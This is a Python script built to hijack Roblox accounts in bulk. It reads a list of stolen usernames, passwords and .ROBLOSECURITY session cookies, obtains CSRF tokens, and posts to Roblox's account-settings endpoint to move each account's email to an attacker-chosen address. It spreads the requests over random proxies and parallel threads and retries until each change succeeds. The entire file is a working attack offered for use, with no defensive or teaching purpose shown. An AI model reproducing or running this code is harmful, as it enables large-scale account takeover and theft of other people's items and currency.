import requests, threading, random
from tenacity import retry

# Put your proxies in a proxies.txt file, separated by a new line.
with open("proxies.txt", "r") as proxies:
    proxies = proxies.read().splitlines()

# Put the email the verifications should go to here.
email = "example@domain.tld"

# This request will repeat itself on failure until success is achieved (email sent).
@retry()
def send(cookie, password):
    with requests.session() as session:
        session.cookies[".ROBLOSECURITY"] = cookie
        # A valid CSRF token is required.
        session.headers["x-csrf-token"] = session.post("https://accountsettings.roblox.com/v1/email").headers["x-csrf-token"]
        s = session.post(
            "https://accountsettings.roblox.com/v1/email",
            data={
                "password": password,
                "emailAddress": email,
                "skipVerificationEmail": False,
            },
            # Don't want to use proxies? this line to proxies=None
            proxies={"http": random.choice(proxies), "https": random.choice(proxies)},
        )
        return print(s.content)


# Replace combos_cookies.txt with the name of your cookie file, they must be separated by a new line.
with open("combos_cookies.txt") as cookies:
    cookies = cookies.read().splitlines()

"""
A cookie file must be formatted as such:
Username:Password:Cookie
The cookie should not include ".ROBLOSECURITY=", it should only be:
"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" and the random string that comes after.
Alternatively you can edit the code below to suit your needs.
"""

for cc in cookies:
    cookie = cc.split("_|")[1]
    cookie = '_|'  + cookie
    passw = cc.split(':')[1]
    threading.Thread(
        target=send,
        args=(
            cookie,
            passw,
        ),
    ).start()
